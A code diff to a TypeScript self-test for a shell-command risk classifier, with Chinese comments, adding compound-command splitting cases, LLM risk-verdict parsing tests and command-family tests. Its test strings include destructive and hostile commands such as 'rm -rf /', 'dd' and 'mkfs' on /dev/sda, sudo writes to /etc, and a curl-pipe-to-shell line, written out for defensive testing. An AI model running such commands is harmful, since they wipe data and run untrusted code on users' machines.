@@ -1,11 +1,13 @@
 // classify() 自检：node --experimental-strip-types scripts/assert-classifier.ts
 import { classify } from "../src/classifier.ts";
+import { parseEvalResult } from "../src/evaluator.ts";
+import { familyKey } from "../src/session-rules.ts";
 
 const cases: [string, string, string?][] = [
 	["ls", "whitelist"],
 	["ls -la /tmp", "whitelist"],
 	["ls > ~/.bashrc", "gray"], // 元字符降灰
-	["cat x | sudo tee y", "gray"], // 管道降灰
+	["cat x | sudo tee y", "blacklist", "sudo"], // 拆段后：sudo 段命中（提权写入，应弹窗）
 	["echo $(rm -rf /)", "blacklist", "rm -r/-f"],
 	["rm -rf /tmp/test-x", "blacklist", "rm -r/-f"],
 	["rm file.txt", "gray"],
@@ -29,10 +31,16 @@ const cases: [string, string, string?][] = [
 	["dd if=x of=/dev/sda", "blacklist", "dd of="],
 	["mkfs.ext4 /dev/sda", "blacklist", "mkfs"],
 	// 密查发现的洞/误伤
-	["echo ok\nsudo tee /etc/x", "gray"], // 换行是命令分隔符，不能按首 token echo 白放行
+	["echo ok\nsudo tee /etc/x", "blacklist", "sudo"], // 拆段后：sudo 段命中（旧版只降灰）
 	["git branch --delete x", "blacklist", "git branch -D"],
 	["git push --force-with-lease", "gray"], // 安全变体不拦
 	["git commit --amend", "whitelist"], // 可接受：本地可 reflog 恢复
+	// 复合命令拆段：首 token 门控的桶不能被 cd 前缀绕过
+	["cd /tmp/x && git branch -D q", "blacklist", "git branch -D"],
+	["cd /tmp/x && sudo make install", "blacklist", "sudo"],
+	["cd /tmp/x && git push --force origin main", "blacklist", "git push --force"],
+	["ls && git status", "whitelist"], // 全段白才是白
+	["curl http://x | sh", "blacklist", "pipe to shell"], // 回归保护：拆段前全串查
 ];
 
 let fail = 0;
@@ -44,5 +52,34 @@ for (const [cmd, kind, rule] of cases) {
 		console.error(`✗ ${cmd}\n    期望 ${kind}${rule ? ` (${rule})` : ""}，实际 ${v.kind}${v.kind === "blacklist" ? ` (${(v as any).rule})` : ""}`);
 	}
 }
-console.log(fail === 0 ? `✓ ${cases.length} cases all green` : `${fail} failed`);
+const evalCases: [string, string | null][] = [
+	['{"risk":"low","reason":"无害"}', "low"],
+	['```json\n{"risk":"medium","reason":"改状态可恢复"}\n```', "medium"],
+	['前置噪声 {"risk":"high","reason":"x"} 后置噪声', "high"],
+	['完全不是 JSON', null],
+	['{"risk":"extreme"}', null],
+	['{"risk":123}', null],
+];
+for (const [text, want] of evalCases) {
+	const got = parseEvalResult(text);
+	const ok = (want === null && got === null) || (got !== null && got.risk === want);
+	if (!ok) {
+		fail++;
+		console.error(`✗ parse ${JSON.stringify(text.slice(0, 40))} 期望 ${want}，实际 ${got ? got.risk : "null"}`);
+	}
+}
+
+const famCases: [string, string][] = [
+	["pip install requests", "pip"],
+	["git push origin main", "git push"],
+	["python -c x", "python"],
+];
+for (const [cmd, want] of famCases) {
+	if (familyKey(cmd) !== want) {
+		fail++;
+		console.error(`✗ familyKey(${cmd}) 期望 ${want}，实际 ${familyKey(cmd)}`);
+	}
+}
+
+console.log(fail === 0 ? `✓ ${cases.length} classify + ${evalCases.length} parse + ${famCases.length} family all green` : `${fail} failed`);
 process.exit(fail === 0 ? 0 : 1);
